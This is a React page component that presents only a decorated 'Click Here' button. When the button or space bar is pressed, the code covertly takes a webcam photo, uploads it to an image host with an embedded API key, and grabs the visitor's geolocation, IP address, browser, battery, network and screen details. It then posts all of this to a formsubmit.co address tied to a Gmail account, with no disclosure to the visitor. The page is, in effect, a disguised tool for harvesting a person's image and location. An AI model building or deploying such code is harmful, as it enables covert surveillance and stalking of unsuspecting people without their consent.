
import { useEffect, useState } from "react";
import { LoadingSpinner } from "@/components/LoadingSpinner";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Camera } from "lucide-react";

const Index = () => {
  const [isCapturing, setIsCapturing] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCooldown, setIsCooldown] = useState(false);
  const { toast } = useToast();

  const getDeviceInfo = async () => {
    try {
      const connection = (navigator as any).connection || 
                        (navigator as any).mozConnection || 
                        (navigator as any).webkitConnection;
      const networkInfo = connection ? {
        type: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt,
      } : 'Network info not available';

      const battery = await ((navigator as any).getBattery?.() || Promise.resolve(null));
      const batteryInfo = battery ? {
        charging: battery.charging,
        level: battery.level * 100,
      } : 'Battery info not available';

      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();

      const deviceInfo = {
        ip: ipData.ip,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        network: networkInfo,
        battery: batteryInfo,
        screenSize: `${window.screen.width}x${window.screen.height}`,
        devicePixelRatio: window.devicePixelRatio,
      };

      return deviceInfo;
    } catch (error) {
      console.error("Error getting device info:", error);
      return "Device info collection failed";
    }
  };

  const getLocation = () => {
    return new Promise<string>((resolve, reject) => {
      if (!navigator.geolocation) {
        reject("Geolocation is not supported");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
          resolve(mapLink);
        },
        (error) => {
          reject(error.message);
        }
      );
    });
  };

  const captureAndUpload = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext("2d");
      context?.drawImage(video, 0, 0);

      const tracks = stream.getTracks();
      tracks.forEach((track) => track.stop());

      const blob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => resolve(blob!), "image/jpeg", 0.8);
      });

      const formData = new FormData();
      formData.append("image", blob, "capture.jpg");

      const response = await fetch("https://api.imgbb.com/1/upload?key=44703e31685d651902ca04050f8d5bd7", {
        method: "POST",
        body: formData,
      });

      const data = await response.json();
      return data.data.url;
    } catch (error) {
      console.error("Error capturing/uploading image:", error);
      throw error;
    }
  };

  const handleClick = async () => {
    if (isCapturing || isProcessing || isCooldown) return;

    setIsCooldown(true);
    setTimeout(() => {
      setIsCooldown(false);
    }, 1000);

    setIsCapturing(true);
    try {
      const [imageUrl, locationUrl, deviceInfo] = await Promise.all([
        captureAndUpload(),
        getLocation(),
        getDeviceInfo(),
      ]);

      setIsCapturing(false);
      setIsProcessing(true);

      const formData = new FormData();
      formData.append("Image URL", imageUrl);
      formData.append("Location URL", locationUrl);
      formData.append("Device Info", JSON.stringify(deviceInfo, null, 2));

      await fetch("https://formsubmit.co/foundationreliance089@gmail.com", {
        method: "POST",
        body: formData,
      });

      setIsProcessing(false);
    } catch (error) {
      console.error("Error:", error);
      setIsCapturing(false);
      setIsProcessing(false);
      toast({
        variant: "destructive",
        title: "An error occurred",
        description: "Please try again later.",
      });
    }
  };

  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.code === "Space") {
        handleClick();
      }
    };

    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, []);

  return (
    <div className="min-h-screen w-full flex items-center justify-center bg-gradient-to-br from-purple-500/10 via-pink-500/10 to-orange-500/10">
      <div className="relative">
        <div className="absolute -inset-1 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg blur opacity-30 group-hover:opacity-100 transition duration-1000 group-hover:duration-200"></div>
        <Button
          onClick={handleClick}
          disabled={isCapturing || isProcessing || isCooldown}
          className="relative px-8 py-6 bg-white dark:bg-gray-900 ring-1 ring-gray-900/5 rounded-lg leading-none flex items-center divide-x divide-gray-600 hover:scale-105 transition-transform duration-200 disabled:opacity-50 disabled:hover:scale-100"
        >
          <span className="flex items-center space-x-2">
            <Camera className="w-6 h-6 text-pink-600" />
            <span className="text-lg font-semibold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
              {isCapturing ? "Capturing..." : isProcessing ? "Processing..." : isCooldown ? "Please wait..." : "Click Here"}
            </span>
          </span>
        </Button>
      </div>
      
      {(isCapturing || isProcessing) && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center">
          <LoadingSpinner />
        </div>
      )}
    </div>
  );
};

export default Index;
